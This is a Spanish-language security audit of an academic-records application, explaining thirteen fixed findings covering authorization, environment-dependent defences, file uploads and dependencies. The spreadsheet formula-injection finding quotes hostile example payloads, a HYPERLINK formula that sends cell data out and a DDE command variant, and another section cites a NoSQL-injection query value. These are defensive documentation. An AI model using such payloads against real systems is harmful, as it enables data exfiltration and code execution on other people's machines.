# Auditoría de seguridad — entradas, formularios y archivos

Auditoría: 2026-09-06 · Correcciones: 2026-09-06 · Alcance: `backend/`, `desktop/`,
`flutter_app/`, `ml_service/`

Revisión de **todo campo por donde entra texto o un archivo**, del saneado de lo
que se guarda, y del registro y el inicio de sesión. Se incluyen los hallazgos
generales que aparecieron por el camino.

**Estado: los trece hallazgos están corregidos.** Este documento se conserva
porque explica *por qué* cada defensa existe, que es lo que impide que alguien
la quite dentro de un año pensando que sobra.

---

## Resumen

| # | Hallazgo | Severidad | Estado |
|---|----------|-----------|--------|
| A1 | `POST /students/bulk` escribía sobre cualquier estudiante sin comprobar alcance | **Alta** | Corregido |
| A2 | Todas las defensas de producción colgaban de `NODE_ENV=production` | **Alta** | Corregido |
| M1 | Inyección de fórmulas en los exportables de Excel | Media | Corregido |
| M2 | `ml_service` sin autenticación en ningún endpoint | Media | Corregido |
| M3 | El `Content-Type` de un formato de trabajo de grado lo elegía el cliente | Media | Corregido |
| M4 | Los tres endpoints de escaneo aceptaban cualquier tipo de archivo | Media | Corregido |
| M5 | `POST /configurations` aceptaba clave y valor arbitrarios, sin auditoría | Media | Corregido |
| M6 | Dependencias con CVE (1 alta, 5 moderadas) + `multer` 1.x fuera de soporte | Media | Corregido |
| B1 | `POST /notifications` dejaba a COORDINATOR escribir a cualquier usuario | Baja | Corregido |
| B2 | El token del socket se aceptaba por *query string* | Baja | Corregido |
| B3 | `jwt.verify` sin `algorithms` fijado | Baja | Corregido |
| B4 | CSP de Tauri sin `object-src`, `base-uri` ni `frame-ancestors` | Baja | Corregido |
| B5 | La extensión del formato subido salía del nombre del cliente | Baja | Corregido |

La validación de entrada de este proyecto ya era sólida: **no se encontró ni una
inyección NoSQL, ni una regex construida sin escapar, ni un `z.string()` sin
tope en una ruta de escritura, ni un XSS en el escritorio.** Los dos hallazgos
altos no eran de saneado — eran de **autorización** y de **configuración**. La
sección «Lo que ya estaba bien» recoge lo que no hay que tocar.

### Verificación tras los cambios

| | Antes | Después |
|---|---|---|
| Pruebas del backend | 374 | **406** (`student-bulk-scope`, `excel-formula-injection`, `uploads`) |
| Pruebas del servicio ML | — | **+17** (`test_security.py`) |
| Pruebas del móvil | 99 | **103** (`keyboard_inset_test`) |
| Pruebas del escritorio | 140 | 140 |
| `npm audit` (backend) | 1 alta, 5 moderadas | **0** |
| `tsc --noEmit`, `eslint`, `flutter analyze` | — | **0 errores** |

---

## A1 · Un docente podía reescribir la ficha de cualquier estudiante

**Dónde estaba:** `modules/students/student.routes.ts` → `student.service.ts`
(`upsertStudents`), y el mismo patrón en `modules/enrollment/enrollment.routes.ts`.

`POST /students/bulk` estaba abierto a `ADMIN`, `PROFESSOR` y `COORDINATOR`,
validaba el cuerpo con Zod perfectamente… y **no comprobaba el alcance de
nadie**. El upsert casa por `code` (la cédula):

```ts
filter: { code: row.code, deletedAt: null },
update: { $set: { ...rest } },
upsert: true,
```

Las dos rutas hermanas sí lo comprobaban (`professorOwnsStudent()` y
`dentroDelAlcanceDePrograma()` en `PATCH` y `DELETE`), así que el lote era la
puerta de atrás de las dos. Y las cédulas las entrega la propia API:
`GET /students/search` es el directorio global, abierto a cualquier docente por
diseño para poder matricular a alguien que aún no es suyo.

Camino completo: buscar en el directorio → obtener cédulas → mandar un lote con
ellas → reescribir `fullName`, `program`, `photoUrl` y `email` de gente de otras
carreras. Con un 201 y sin ninguna traza de que fue una modificación ajena.

**Corrección.** `particionarLotePorAlcance()` en `domains/scope/professor-scope.ts`
— pura, con siete pruebas. Separa lo que **crea** de lo que **modifica**:

- Una fila cuya cédula no existe todavía: **siempre se permite.** Es el trabajo
  legítimo de la ruta; importar el listado de un grupo trae gente que el sistema
  no conoce.
- Una fila cuya cédula ya existe: solo si ese estudiante está en el alcance de
  quien llama.

Las rechazadas vuelven en la respuesta (`rechazadas: [...]`) en vez de
descartarse en silencio: un lote que dice «300 importados» habiendo escrito 280
es una pérdida de datos con buena presentación. Si no queda ninguna fila
escribible, la respuesta es un 403 que lo explica.

El alcance lo compone `alcanceDeEscrituraDeEstudiantes()`, que **intersecta** el
del docente (por matrícula) con el de coordinación (por programa) — nunca los
suma: un docente de otra carrera no gana alcance por ser también docente.

**`POST /enrollments/bulk` tenía el mismo agujero y una consecuencia peor.** Su
`$set` llevaba `fullName` y `email`, y esta es la ruta que recibe lo que salió de
un OCR. Un nombre mal leído sobre una cédula correcta **no da error: renombra en
silencio a una persona real**, y eso aparece semanas después en un acta. Ahora
todo lo identitario vive en `$setOnInsert` y la respuesta separa `creados` de
`reutilizados`. Corregir el nombre de alguien que ya existe se hace por su ficha,
que comprueba el alcance y queda en la auditoría.

---

## A2 · Sin `NODE_ENV=production` el servidor arrancaba con secretos de juguete

**Dónde estaba:** `shared/env.ts`, `app.ts`, `modules/auth/recovery.service.ts`.

`validarProduccion()` es la comprobación que impide desplegar con secretos por
defecto y CORS abierto. Su primera línea era:

```ts
export function validarProduccion(): void {
  if (!esProduccion) return;   // ← NODE_ENV !== 'production'
```

**El guardián solo se activaba si ya estaba puesta la variable que él mismo
tendría que verificar.** Un `pm2 start` sin `NODE_ENV`, un `systemd` sin
`Environment=` o un contenedor al que se le olvidó la variable arrancaban sin un
solo aviso y con:

| | Valor efectivo | Consecuencia |
|---|---|---|
| `JWT_ACCESS_SECRET` | `'dev-access'` | Escrito **en este repositorio**. Cualquiera que lo lea firma un token con `role: 'ADMIN'`. |
| `JWT_REFRESH_SECRET` | `'dev-refresh'` | Ídem, con 30 días de validez. |
| `CLIENT_ORIGIN` | `'*'` | CORS abierto a cualquier origen. |
| Límite de login | **desactivado** | Fuerza bruta con el cupo general de 250/15 min. |
| `trust proxy` | desactivado | Detrás de un proxy, el limitador cuenta a toda la institución como un cliente. |
| `SMTP_HOST` | vacío | `/recovery/request` devolvía `devCode` **en la respuesta**. |

La última fila es la que lo convertía de «configuración floja» en cadena
completa: toma de cuenta de un paso conociendo solo un correo del directorio.

**Corrección, en tres partes.**

1. **Los secretos de firma se validan siempre que haya `MONGODB_URI`
   configurada.** Esa es la señal de que no es un clon recién hecho: nadie
   apunta una base de verdad para trastear. `NODE_ENV` sigue decidiendo lo que
   sí molestaría en local (CORS acotado, servidor de correo). El mensaje de
   error lo dice explícitamente cuando salta fuera de producción.
2. **El límite de login y `trust proxy` dejan de depender de `NODE_ENV`.** El
   límite va siempre (diez intentos cada quince minutos no estorban a nadie
   desarrollando); `trust proxy` pasa a `TRUST_PROXY`, que sin declarar sigue a
   `NODE_ENV` — el despliegue que ya funciona detrás de Caddy no cambia. Poder
   apagarlo importa igual: con `trust proxy` y sin proxy delante, cualquiera
   manda su `X-Forwarded-For` y estrena cupo en cada petición.
3. **`devCode` exige `ALLOW_DEV_RECOVERY_CODE=1`**, además de las dos
   condiciones anteriores. Antes se **deducía de dos ausencias**, y deducir un
   permiso a partir de lo que falta es lo contrario de conceder un permiso.

`npm run check:env` comprueba las tres y avisa de las combinaciones peligrosas.

---

## M1 · Inyección de fórmulas en los exportables de Excel

**Dónde estaba:** `modules/reports/reports.routes.ts` y
`modules/coordination/coordination.renderer.ts` — ocho llamadas a `ws.addRow()`.

Los valores del catálogo de columnas iban a la hoja tal cual, y varias de esas
columnas son texto que escribe gente: `Estudiante` viene de importar un listado,
del OCR de una foto o de un docente escribiendo; `Observacion` son 500
caracteres libres.

Excel y LibreOffice ejecutan cualquier celda que empiece por `=`, `+`, `-`, `@`,
tabulador o retorno de carro. Un estudiante llamado
`=HYPERLINK("http://…"&A1,"Ver acta")` se ejecuta **en la máquina de quien abre
el acta** — coordinación o secretaría —, y la variante con `cmd|'/c …'!A0` sigue
funcionando en instalaciones sin los parches de DDE. **El que ejecuta no es el
que escribió**, y el que escribió ni siquiera tiene que ser alguien de dentro:
basta que el nombre entre por el escáner de una planilla.

`shared/sanitize.ts` no lo cubría: sanea lo que se **guarda** en auditoría y
telemetría, no lo que **sale** hacia un archivo. Son dos fronteras distintas.

**Corrección.** `celdaSegura()` y `agregarFila()` en `excel.renderer.ts`, y las
ocho llamadas migradas. Antepone el apóstrofo que Excel entiende —fuerza el
contenido a texto y no se ve al abrir— y **deja los números intactos**: un `-2`
numérico es una nota o un conteo, y convertirlo a texto rompería las sumas de la
hoja. Catorce casos fijados en `tests/excel-formula-injection.test.ts`, la mitad
de ellos comprobando que el texto normal **no** se toca.

---

## M2 · `ml_service` no autenticaba nada

**Dónde estaba:** los nueve endpoints de `ml_service/app/main.py`.

Ni un token, ni una cabecera compartida, ni una lista de IP. Incluía:

- `POST /train` — **reentrena y promueve** el modelo de riesgo. Quien llegue a él
  decide qué estudiantes salen marcados en rojo en las tres aplicaciones.
- Los cuatro `/vision/*` — reciben archivos y los pasan por `opencv`,
  `rapidocr-onnxruntime` y `pypdf`: tres parsers nativos.
- `/predict`, `/rubri/intent`, `/metrics` — el comportamiento del modelo.

Lo único que lo acotaba era que `uvicorn` sin `--host` escucha en `127.0.0.1`.
Eso es una convención, no un cierre: un `--host 0.0.0.0` en un `docker run` o en
un script de arranque lo abría entero, y nada lo advertía. Una defensa que
depende de que nadie escriba una bandera es una casualidad, no una defensa.

**Corrección.** `ml_service/app/security.py`:

- Secreto compartido en la cabecera `X-ML-Secret`, comparado con
  `hmac.compare_digest` para que el tiempo de respuesta no diga cuántos
  caracteres iniciales se acertaron.
- **Sin secreto configurado no exige nada mientras escuche solo en la
  loopback**: es el modo local de siempre, y es lo que hace que un `git clone`
  arranque sin configurar.
- **`validar_arranque()` mata el proceso** si `ML_HOST` sale de la loopback y no
  hay secreto. La comprobación vive en el servicio porque es el único sitio
  donde se sabe en qué interfaz escucha.
- `/health` queda fuera: es la sonda con la que el backend decide si el servicio
  está vivo, y tiene que poder responder antes de compartir nada.

Del lado del backend, las nueve llamadas pasan ahora por `shared/ml-client.ts`
(`mlFetch`), que añade la cabecera y el tiempo de espera. Estaban repartidas en
seis módulos: añadir la cabecera en cada uno garantiza que la que se añada
mañana se olvide, y **una llamada sin cabecera no falla de forma visible** —
funciona en local, funciona en las pruebas, y solo se cae el día del despliegue.

17 pruebas en `ml_service/tests/test_security.py`.

---

## M3 · El navegador recibía el `Content-Type` que eligió quien subió el archivo

**Dónde estaba:** `modules/thesis/thesis.routes.ts`.

El filtro aceptaba con **O**, no con **Y**:

```ts
if (MIMES_PERMITIDOS.has(file.mimetype) || EXTENSIONES.test(file.originalname))
```

Los dos lados los escribe el cliente, así que bastaba cumplir uno. Un archivo
llamado `guia.pdf` con `Content-Type: text/html` pasaba, ese mimetype quedaba
guardado en la ficha, y la descarga lo devolvía tal cual: HTML servido desde el
origen de la API. Lo único que lo salvaba era el `attachment` de la línea
siguiente — es decir, la suerte, no la validación.

**Corrección.** El módulo `shared/uploads.ts` centraliza qué tipos acepta el
sistema y cómo se reconocen por su firma real. En `thesis/`:

- El `fileFilter` descarta por mimetype declarado (primer corte, antes de leer
  el cuerpo) y `exigirTipoReal()` comprueba **los bytes** después.
- El `Content-Type` de la descarga se deriva de la extensión con la que el
  servidor guardó el archivo, no del campo `mimetype` de la ficha. Eso normaliza
  además los formatos subidos antes de este cambio sin migrar la colección.
- Se añade `X-Content-Type-Options: nosniff`, que es como un `attachment` acaba
  ejecutándose igualmente.
- `nombreParaDescarga()` quita comillas y saltos de línea del `Content-Disposition`
  (`res.setHeader` revienta con `ERR_INVALID_CHAR`, así que esto evita el 500).

`POST /uploads/image` ya hacía lo correcto y era el modelo a copiar; ahora los
dos usan el mismo módulo en vez de tener cada uno su copia.

---

## M4 · Los endpoints de escaneo aceptaban cualquier archivo

**Dónde estaba:** `attendance-scan.routes.ts`, `grade-scan.routes.ts`,
`enrollment.routes.ts`.

Los tres declaraban `multer({ storage: memoryStorage(), limits: { fileSize } })`
y **ningún `fileFilter`**. Lo que llegara se reenviaba tal cual al servicio de
visión, que lo abre con `pypdf`, `opencv` y `rapidocr`. Tres parsers nativos con
superficie de ataque real, alimentados con bytes sin filtrar desde una sesión de
docente.

Además, `esExcel()` decidía **qué parser abría los bytes** con un `||` sobre el
mimetype y el nombre del archivo, los dos escritos por el cliente.

**Corrección.** Los tres estrenan `filtroPorMimetype(ENTRADA_DE_ESCANER, …)` y
`exigirTipoReal()` tras leer el archivo. `esExcel()` recibe ahora el
`TipoAceptado` ya reconocido, no el `req.file`: es la firma la que decide si el
archivo se interpreta en el backend o va al servicio de visión.

---

## M5 · `POST /configurations` era la puerta de atrás de la configuración validada

**Dónde estaba:** `modules/settings/config.routes.ts`.

```ts
const body = z.object({ key: z.string().min(1), value: z.any() }).parse(req.body);
```

Solo ADMIN, sí. Pero `configuraciones` es donde viven cosas que **otras rutas
validan con cuidado**: `descargas` (que obliga a HTTPS y a una lista de hosts,
porque quien controle ese enlace controla el instalador que la gente baja),
`report_template` y `registro_docentes_abierto`. Encima: `key` sin `.max()`,
`value` de hasta 2 MB, y **sin `auditChange()`**, mientras que
`PUT /descargas` sí audita.

**Corrección.** Lista blanca de claves con su esquema por clave; las que tienen
ruta propia (`descargas`, `report_template`) se rechazan con un 409 que dice por
dónde se escriben; y `auditChange()` en la escritura. Ningún cliente usaba esta
ruta, así que endurecerla no rompe nada.

---

## M6 · Dependencias

`npm audit` en `backend/` pasó de **1 alta + 5 moderadas** a **0**:

| Paquete | Severidad | Cómo se resolvió |
|---|---|---|
| `fast-uri` (SSRF, confusión de host, ×4) | **Alta** | `npm audit fix` |
| `qs` → `body-parser` → `express` | Moderada | `overrides: { "qs": "^6.16.0" }` |
| `uuid` <11.1.1 → `exceljs` | Moderada | `overrides: { "uuid": "^11.1.1" }` |

El `override` de `uuid` evita el `audit fix --force`, que habría bajado `exceljs`
a 3.4.0 —una regresión mayor— y se verificó generando un libro y cargando el
módulo de `exceljs` que usa `uuid`.

**`multer` subió de `1.4.5-lts.2` a `2.3.0`.** La rama 1.x está fuera de soporte
y acumula avisos de denegación de servicio con peticiones multipart malformadas.
Hay cinco rutas de subida en el proyecto.

El escritorio da **0 vulnerabilidades** y no necesitó cambios.

---

## Hallazgos bajos

**B1 · `POST /notifications`.** Un `PROFESSOR` solo podía escribirse a sí mismo,
pero un `COORDINATOR` mandaba `title`, `message` y `link` arbitrarios a
**cualquier `userId`**: un canal de suplantación con la cara del sistema.
Ahora coordinación queda acotada a las cuentas de su alcance
(`req.alcance.professorIds`) y a sí misma. `link` se valida como ruta interna en
el servidor (`/^\/[^/\\]/`, que además descarta `//host`) y `metadata` deja de
ser `z.record(z.any())` sin tope. Los dos clientes ya comprobaban
`startsWith('/')` — el móvil con `esNavegable`, el escritorio en línea — y los
dos se endurecieron igual contra la forma protocolo-relativa, porque las
notificaciones ya guardadas no se revalidan al leerlas.

**B2 · Token del socket por query string.** `extractToken` aceptaba
`?token=<jwt>` y ningún cliente lo usaba. Retirado: un token en la URL acaba en
el log de acceso de cualquier proxy, en el historial de conexiones y en el
`Referer`. Quedan `auth.token` y la cabecera `Authorization`.

**B3 · `jwt.verify` sin algoritmo.** `jsonwebtoken` 9 ya rechaza `alg: none` con
secreto de cadena, así que no había nada explotable. Se fija `HS256` al firmar y
al verificar: cierra la familia entera de sorpresas por una línea.

**B4 · CSP de Tauri.** `connect-src ... https:` se **conserva** y no es un
descuido: la URL del servidor la elige el usuario en tiempo de ejecución, así
que acotarla a orígenes concretos rompería esa capacidad. Se añadió lo que sí
faltaba: `script-src 'self'`, `object-src 'none'`, `base-uri 'self'`,
`frame-ancestors 'none'`, `frame-src 'none'`, `form-action 'none'` y
`font-src 'self' data:`.

**B5 · Extensión del formato.** Salía de `path.extname(originalname)`. No había
travesía de rutas (`path.extname` no cruza separadores), pero sí permitía dejar
un `.html` o un `.svg` en `formatos/`. Ahora sale de `nombreEnDisco(tipo)`, con
la extensión del tipo reconocido.

---

## Lo que ya estaba bien

Esto **no** es relleno: es lo que no hay que tocar, y varias piezas son mejores
que la media de lo que se ve en proyectos de este tamaño.

**Validación de entrada.** Todas las rutas de escritura parsean con Zod, y los
topes de longitud viven en un único sitio (`shared/validation.ts`) con el porqué
escrito. No hay ni un `z.string()` sin `.max()` en una ruta que guarde.

**Inyección NoSQL: no hay.** Revisado cada uso de `req.query` que llega a un
filtro de Mongo. Todos pasan por `String(...)` o por un esquema Zod: un
`?studentId[$ne]=x` se convierte en `"[object Object]"`, no casa, y `error.ts`
lo traduce a 404. `filtroDeListado()` aplica el ámbito del rol **después** de lo
que pide la URL, que es la regla que impide que `?studentId=<otro>` devuelva las
notas de otro.

**Inyección de regex: no hay.** Los siete sitios que construyen un `RegExp`
desde texto del usuario escapan los metacaracteres.

**Contraseñas.** `bcrypt` con coste 12; tope de 128 bytes en todas las puertas,
con el razonamiento correcto (bcrypt solo mira 72 bytes, y sin tope una cadena
de megabytes ocupa el único hilo de Node); una sola política compartida por
autorregistro, alta administrativa y recuperación.

**Login.** 401 idéntico exista o no la cuenta. La comprobación de
`PENDIENTE`/`RECHAZADO` va **después** de verificar la contraseña, así que no
sirve para enumerar correos.

**Sesiones.** Rotación del refresh token con detección de reutilización que
revoca toda la familia. Cambiar la contraseña exige la actual, revoca todas las
sesiones y devuelve un par nuevo.

**Recuperación.** Código de seis dígitos por `crypto.randomInt`, guardado con
`bcrypt`, cinco intentos, cooldown atómico por cuenta, consumo dentro de una
transacción y revocación de sesiones al terminar.

**Almacenamiento de credenciales.** Escritorio: llavero del sistema vía Rust,
con lista blanca de tres claves para que el WebView no pueda usarlo como almacén
arbitrario; ni un token en `localStorage`. Móvil: `flutter_secure_storage`
(Android Keystore) con migración desde las preferencias planas que además borra
el origen.

**El respaldo de Linux, y por qué existe con lo que cuesta.** En Windows y macOS
el llavero es parte del sistema y siempre responde. En Linux es un paquete que
puede no estar instalado —XFCE mínimo, i3, varios Debian de escritorio—, y ahí
la garantía anterior no se cumple porque no hay dónde cumplirla: guardar la
sesión falla y la aplicación no se puede usar. `almacen_linux` guarda entonces
en `~/.local/state`, modo `0600`, cifrado con XChaCha20-Poly1305.

Lo que ese respaldo protege, dicho sin adornos: la clave se **deriva de la
máquina y del usuario**, así que quien ya ejecuta código como este usuario puede
derivarla igual. Su defensa real frente a un atacante local son los permisos del
archivo, la misma que protege una clave SSH. Lo que sí gana es que el contenido
no sea legible fuera de esa máquina: una copia de seguridad, un directorio
sincronizado a la nube o un disco que se manda a reparar no entregan un JWT a
quien lo mire.

Por eso el llavero se intenta **siempre primero**, se cae al archivo solo cuando
no hay alternativa, y la pantalla de Configuración dice cuál de los dos está en
uso (`secure_store_backend`). Presentar los dos como equivalentes sería vender
una garantía que en esa máquina no se está dando, y esa pantalla existe
precisamente para lo contrario. La lista blanca de claves se comprueba también
en el camino del respaldo: si solo la comprobara `Entry`, un fallo del llavero
la volvería opcional justo en la ruta que se usa cuando algo va mal.

**Red del móvil.** `cleartextTrafficPermitted="false"`, con excepción solo para
`localhost`, `127.0.0.1` y `10.0.2.2`.

**Tauri.** Capacidades mínimas y justificadas; `save_download` quita cualquier
componente de directorio antes de escribir.

**Cabeceras y cortes.** `helmet()`, CORS por lista, límite global de tasa, y
límites propios y más estrictos en login, recuperación, cambio de contraseña,
registro, telemetría y asistente — estos contando **por usuario y no por IP**,
que es lo correcto cuando todo un campus sale por una sola dirección. El
manejador de errores nunca devuelve detalle interno en un 5xx.

**Autorización.** Revisadas las 148 rutas: **ninguna** queda sin `requireRole` o
`exigirSesion`, sea en la ruta o en el `use()` del router. Las públicas
(`/registro/catalogo`, `GET /descargas`, `/health`) lo son a propósito y lo
documentan.

**Saneado de auditoría y telemetría** (`shared/sanitize.ts`). Se aplica al
**escribir**, no al leer, con lista de claves prohibidas normalizadas y
enmascarado por patrón dentro de texto libre, con topes de profundidad, claves y
tamaño total.

---

## Qué vigilar de aquí en adelante

Tres cosas que este trabajo dejó como regla y que se rompen por omisión:

1. **Un lote no hereda las comprobaciones de la ruta unitaria equivalente.**
   Cuando el filtro de una escritura masiva es un dato del cuerpo —una cédula, un
   código de materia—, el alcance hay que comprobarlo explícitamente. Es lo que
   falló en A1, en dos rutas a la vez.
2. **Lo que sale hacia un archivo necesita su propio saneado.** El de la base de
   datos no sirve: son fronteras distintas, y la de salida es la que ejecuta
   código en la máquina de otra persona (M1).
3. **Una defensa que depende de una variable de entorno tiene que fallar
   ruidosamente si la variable falta**, no volverse permisiva. A2 y M2 son el
   mismo error dos veces: `if (!esProduccion) return` y «escucha en localhost
   porque nadie puso `--host`».
